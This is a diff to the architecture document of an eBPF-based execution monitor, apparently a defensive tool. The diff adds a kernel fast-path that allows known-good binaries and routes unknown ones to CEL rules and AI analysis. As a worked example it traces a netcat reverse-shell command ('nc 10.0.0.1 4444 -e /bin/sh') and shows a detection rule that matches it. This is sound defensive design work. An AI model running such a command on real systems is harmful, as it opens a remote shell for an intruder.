@@ -16,11 +16,14 @@ direction TB
 hook["execve() ──► LSM Hook (bprm_check_security)"]
 vmap{"verdict_map lookup"}
 block_kern["BLOCK → -EPERM"]
+allow_fast["ALLOW fast-path → return 0\n(no ring buffer, counter++)"]
 ringbuf[("Ring Buffer")]
 
 hook --> vmap
 vmap -- "BLOCK" --> block_kern
-vmap -- "ALLOW / UNKNOWN" --> ringbuf
+vmap -- "ALLOW" --> allow_fast
+vmap -- "UNKNOWN" --> ringbuf
+block_kern --> ringbuf
 end
 
 %% Cross-boundary connection
@@ -87,8 +90,11 @@ execve("/usr/bin/nc", ["nc", "10.0.0.1", "4444", "-e", "/bin/sh"])
 
 1. The LSM hook on `bprm_check_security` fires.
 2. Extract the binary's `{inode_number, device_id}` from `linux_binprm → file → f_inode`.
-3. Look up `verdict_map` — if BLOCK, return `-EPERM` (execution never starts).
-4. Reserve a slot in the ring buffer and populate the `event` struct:
+3. Look up `verdict_map`:
+   - **ALLOW hit:** Increment `baseline_allow_counter`, return `0`. No ring buffer event is produced — userspace is not involved at all. This is the kernel fast-path for known-good binaries.
+   - **BLOCK hit:** Emit the event with `is_map_hit=1`, return `-EPERM`. The ring buffer event reaches userspace; the engine short-circuits to an audit emit without re-running policy.
+   - **No hit:** Emit the event with `is_map_hit=0`, return `0`. The ring buffer event reaches userspace for full Tier 2/3 evaluation.
+4. Reserve a slot in the ring buffer and populate the `event` struct (BLOCK and unknown paths only):
    - `argv` = `/usr/bin/nc` (from `bprm->filename`)
    - `script_argv` = `10.0.0.1` (raw argv[1] — not a script, just an argument)
    - `pid`, `ppid`, `uid`, `cgroup_id`, `inode_number`, `device_id`
@@ -96,20 +102,21 @@ execve("/usr/bin/nc", ["nc", "10.0.0.1", "4444", "-e", "/bin/sh"])
 
 **Go Engine:**
 
-1. **Interpreter check:** `filepath.Base("/usr/bin/nc")` = `"nc"` → not in the interpreter set → skip script resolution.
-2. **Tier 1 — Inode Cache:** Check if this binary's inode is in the LRU cache (known-good). If yes, return `ALLOW` immediately.
-3. **Tier 2 — CEL Rules:** Evaluate the event against all loaded rules (first match wins). CEL conditions can inspect `argv`, `uid`, `pid`, `cgroup_id`, etc. Three outcomes:
+1. **Kernel BLOCK short-circuit:** If the event has `is_map_hit=1`, the engine is bypassed entirely. An audit record is emitted directly (`Tier: 1, Action: "BLOCK"`) and processing continues to the next event.
+2. **Interpreter check:** `filepath.Base("/usr/bin/nc")` = `"nc"` → not in the interpreter set → skip script resolution.
+3. **Tier 1 — Inode Cache:** Check if this binary's inode is in the LRU cache (known-good). If yes, return `ALLOW` immediately.
+4. **Tier 2 — CEL Rules:** Evaluate the event against all loaded rules (first match wins). CEL conditions can inspect `argv`, `uid`, `pid`, `cgroup_id`, etc. Three outcomes:
    - **BLOCK** match → `SIGKILL` + write inode to `verdict_map` (in lockdown mode).
      ```yaml
      condition: 'argv.contains("nc") && argv.contains("-e") && argv.contains("/bin/sh")'
      ```
-   - **ALLOW** match → add inode to Tier 1 cache immediately + skip Tier 3. This fast-paths trusted system binaries (`/usr/bin/grep`, `/usr/sbin/modprobe`, etc.) so they don't consume AI analysis capacity.
+   - **ALLOW** match → add inode to Tier 1 cache + write `VERDICT_ALLOW` to kernel `verdict_map` + skip Tier 3. The next execution of this binary will be handled entirely in the kernel fast-path.
      ```yaml
      condition: 'argv.startsWith("/usr/bin/") || argv.startsWith("/usr/sbin/")'
      ```
    - **ALERT** match → log only, execution proceeds.
-4. **Tier 3 — AI Queue:** If no rule matched, cache the inode as known-good and route the event to the AI analysis queue (rate-limited). Events that matched an ALLOW rule at Tier 2 are **not** routed here.
-5. **Audit:** Emit an `AuditEvent` with the full decision context to all configured outputs (JSON, Parquet, Text).
+5. **Tier 3 — AI Queue:** If no rule matched, cache the inode as known-good, write `VERDICT_ALLOW` to the kernel map, and route the event to the AI analysis queue (rate-limited). AI ALLOW verdicts also promote the binary's inode to the kernel fast-path so subsequent runs are invisible to userspace. Events that matched an ALLOW rule at Tier 2 are **not** routed here.
+6. **Audit:** Emit an `AuditEvent` with the full decision context to all configured outputs (JSON, Parquet, Text).
 
 ### Path 2: Script/Interpreter Execution
 
@@ -176,6 +183,7 @@ This list is configurable via `spec.interpreters` in the config file. Both bare 
 - **Population:** Binaries (or scripts) are added to the cache in two scenarios:
   1. **No rule match** — the event passes Tier 2 without matching, and is added as known-good before routing to Tier 3.
   2. **ALLOW rule match** — an explicit ALLOW rule matches at Tier 2, adding the inode immediately and skipping Tier 3 entirely. This is the primary mechanism for fast-pathing trusted system binaries.
+- **Kernel promotion:** Both population paths also write `VERDICT_ALLOW` to the kernel `verdict_map`. On the *next* execution of the same binary, the eBPF hook handles it entirely in-kernel (< 1 μs, no ring buffer event). The `baseline_allow_counter` per-CPU map tracks the invisible volume; Phase 4 exposes it as a Prometheus metric.
 
 ### Tier 2: CEL Policy Engine
 
@@ -208,7 +216,7 @@ This list is configurable via `spec.interpreters` in the config file. Both bare 
 
 - **Purpose:** Catch obfuscated threats that static rules miss (Base64-encoded payloads, novel exploit patterns).
 - **Rate limiting:** Token bucket algorithm prevents overwhelming the AI provider.
-- **Feedback loop:** AI verdicts flow back into the verdict map, promoting runtime detections to kernel-speed enforcement.
+- **Feedback loop:** AI verdicts flow back into the verdict map: BLOCK verdicts write `VERDICT_BLOCK` (kernel denies on next exec), ALLOW verdicts write `VERDICT_ALLOW` (kernel fast-path on next exec). After one AI ALLOW verdict, subsequent executions of the same binary never reach userspace again.
 
 ---
 
